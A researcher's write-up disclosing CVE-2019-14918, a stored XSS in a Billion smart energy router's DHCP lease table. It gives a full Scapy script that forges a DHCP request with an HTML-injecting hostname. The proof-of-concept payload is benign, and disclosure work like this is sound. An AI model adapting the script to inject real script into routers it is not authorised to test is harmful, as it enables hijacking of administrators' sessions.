This is the third of three mini-posts where I will write about some fun discoveries

- 1/3: [Dissecting a ~~piñata~~Router](https://github.com/MarioBartolome/ForFun/blob/master/HW-Hacking/Dissecting-a-router.md)
- 2/3: [CVE-2019-14919, CVE-2019-14920. Inspecting a router's firmware and reversing binaries to achieve RCE](https://github.com/MarioBartolome/ForFun/blob/master/HW-Hacking/Firmware-Inspection.md)
- 3/3: **CVE-2019-14918. Stored XSS via DHCP injection**


# 0x03 Stored XSS via DHCP injection

This is kinda cool :) I really enjoyed exploiting this kind of vulnerability. 

A stored XSS allows an attacker to *permanently* store code into a website, thus, allowing to achieve code execution on the client side, just by visiting the affected site.

When found, it's usually making use of the parameters on a request. But this one requires a little bit more to accomplish the injection. 

## The scene

When accessing a router's administration web interface, we're usually presented with a simple menu on the left, and a table containing the DHCP leases the router has granted. 

Those DHCP leases usually show the device name, the assigned IP address, sometimes the device's MAC address and the lease remaining time.
This case is no different. When logged in, the DHCP table is shown, and the different clients that requested an IP address lease are listed on it. 

So my twisted mind starts to twist...

## Injecting in the name of...

A DHCP request can be composed by various fields, but for the sake of simplicity I will only list the needed ones here: 

- Message Type: This field sets the kind of query we'll be sending (it could be a **request**, a discover, a decline, a release...).
- Requested IP Address: This is the IP address we'll be requesting.
- A HostName (this is our injection point).
- End of query. 

Check the [RFC2131](https://tools.ietf.org/html/rfc2131) if you want a ton of information to choke on.


## Scapy to the rescue

So, how to send this kind of packet with such a customization? Scapy will be my weapon of choice for this kind of matter. 

Scapy, is a Python library that allows to forge a vast amount of protocols. It's able to compose every layer of a protocol, in this case, we will create the following layers: 

- Ethernet
- IP
- UDP
- BOOTP
- DHCP

```python
from scapy.all import get_if_raw_hwaddr, mac2str, Ether, IP, UDP, BOOTP, DHCP, sendp
```


### Ethernet layer

The first layer to assemble is the Ethernet layer. By default, Scapy will provide with the optional parameters, so only the source and destination MAC addresses are needed on this step. 

To issue a DHCP request, the destination MAC address should be the broadcast one (`FF:FF:FF:FF:FF:FF`), and the source one our own MAC address.

```python
fam, my_mac = get_if_raw_hwaddr("eth0")
brdcast_mac = mac2str("ff:ff:ff:ff:ff:ff")

ether_layer = Ether(src=my_mac, dst=brdcast_mac)
```

### IP layer

The second layer to assemble is the IP layer. Again, Scapy will take care of most of the parameters and we'll only need to issue the source and destination. The source address should be set to `0.0.0.0` and the destination address should be set to the network broadcast address `255.255.255.255`.

```python
ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")
```
That's it for this layer!

### UDP layer

The third layer will define the kind of transmission protocol to use. DHCP should be driven on a state-less manner, so UDP must be used. The layer must set the source and destination port. The DCHP request must come from port 68 and the server is likely to be running at port 67.

```python
udp_layer = UDP(sport=68, dport=67)
```

### BOOTP layer

DHCP is an extension of BOOTP, so in this layer we will only define the client MAC address. 

```python
bootp_layer = BOOTP(chaddr=my_mac)
```

### DHCP layer

Finally! The interesting stuff. As stated before, the `message-type`, `requested_addr`, `hostname` and `end` fields will be defined. That way the server will be happy with the request, and will attempt to issue a lease for us, adding a new entry to the DHCP table visible on the web interface, aaaaand the injection will take place. 

```python
dhcp_layer = DHCP(options=[
	('message-type', 'request'),
	('requested_addr', '192.168.5.100'),
	('hostname', '</td><h1>0xMrIO'),  # Here's where the injection takes place! 
	'end',
	'\x00' * 11
	]
)
```

As shown above, the `'hostname'` parameter performs the injection against the DHCP lease table.
What's that `\x00' * 11`? A padding. The server running on this router wouldn't be ok without a packet size divisible by 16.

## To summarize

Scapy allows to assemble the whole packet by *dividing* its layers. Every layer in Scapy has overloaded the division operator to achieve packet assembly.

So the whole code would be like:

```python
from scapy.all import get_if_raw_hwaddr, mac2str, Ether, IP, UDP, BOOTP, DHCP, sendp
fam, my_mac = get_if_raw_hwaddr("eth0")
brdcast_mac = mac2str("ff:ff:ff:ff:ff:ff")

ether_layer = Ether(src=my_mac, dst=brdcast_mac)
ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")
udp_layer = UDP(sport=68, dport=67)
bootp_layer = BOOTP(chaddr=my_mac)
dhcp_layer = DHCP(options=[
	('message-type', 'request'),
	('requested_addr', '192.168.5.100'),
	('hostname', '</td><h1>0xMrIO'),  # Here's where the injection takes place! 
	'end',
	'\x00' * 11
	]
)

dhcp_request = ether_layer / ip_layer / udp_layer / bootp_layer / dhcp_layer

sendp(dhcp_request)
```

By keeping WireShark listening on the desired interface, we can note how the packet sent is a successful DHCP request, and is properly answered by the DHCP server running in the router. 

![DHCP Req and ACK](https://user-images.githubusercontent.com/23175380/64935620-8e6df700-d852-11e9-9abd-759997a711fe.png)

---

And finally, the DHCP lease table is altered, and our code was successfully injected: 

![DHCP lease table modified](https://user-images.githubusercontent.com/23175380/64935660-c2e1b300-d852-11e9-9e50-67d00b0b3a32.png)


1. Is the `<h1>0xMrIO` injection.
2. That's the point where the hostname should be stored. 
3. That's the `</td>` issued to close that table field.

---

**Affected product/version:** Billion Smart Energy Router SG600R2. Firmw v3.02.rc6
- CVE-2019-14918

